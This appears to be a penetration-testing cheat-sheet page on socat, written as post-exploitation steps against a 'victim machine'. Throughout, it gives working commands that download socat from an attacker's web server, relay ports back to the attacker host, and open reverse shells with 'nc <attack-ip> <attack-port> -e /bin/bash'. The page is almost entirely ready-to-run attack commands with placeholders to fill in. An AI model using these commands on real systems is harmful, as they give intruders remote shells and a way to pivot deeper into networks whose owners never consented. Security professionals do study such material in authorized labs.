---
title: Socat
desc: A relay for bidirectional data transfers between two independent data channels.
tags: [Linux, Pivoting, PortForwarding, PostExploitation, ReverseShell, SSH]
alts: [Chisel, SSH, Sshuttle]
website:
render_with_liquid: false
---

## Install Socat to Target Machine

Socat is usually not installed default, so you may have to install it to target machine.

```sh
# On attack machine, open web server
cd /usr/bin/
python -m http.server

# --------------------------------------------------

# On victim machine, download socat from attack machine
wget http://<attack-ip>/socat -O ./socat
# or
curl <attack-ip>/socat -o ./socat
```

<br />

## Port Forwarding (Easy)

```sh
# On attack machine, listen
nc -lvnp <attack-port>

# --------------------------------------------------

# On victim machine
./socat tcp-l:<victim-port>,fork,reuseaddr tcp:<attack-ip>:<attack-port> &
nc <attack-ip> <attack-port> -e /bin/bash

# -------------------------------------------------

# On attack machine, connect successfully
whoami

# -------------------------------------------------

# On victim machine
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1
```

<br />

## Port Forwarding (Quiet)

```sh
# On attack machine, open up two ports
./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

# ------------------------------------------------

# On victim machine
# Make a connection between the listening port 8001 on attack machine, and the port of the victim machine.
./socat tcp:<attack-ip>:8001 tcp:<victim-ip>:<victim-port>,fork &

# -----------------------------------------------

# On attack machine
# <victim-ip> binds localhost, so you can access to localhost:<victim-port>

# -------------------------------------------------

# On victim machine
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1
```

<br />

## Reverse Shell Relay

```sh
# On attack machine, listen
nc -lvnp <attack-port>

# -------------------------------------------------

# On victime machine, 
./socat tcp-l:8000 tcp:<attack-ip>:<attack-port> &
nc 127.0.0.1 8000 -e /bin/bash

# -----------------------------------------------

# On attack machine, connect successfully
whoami

# -------------------------------------------------

# On victim machine
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1

```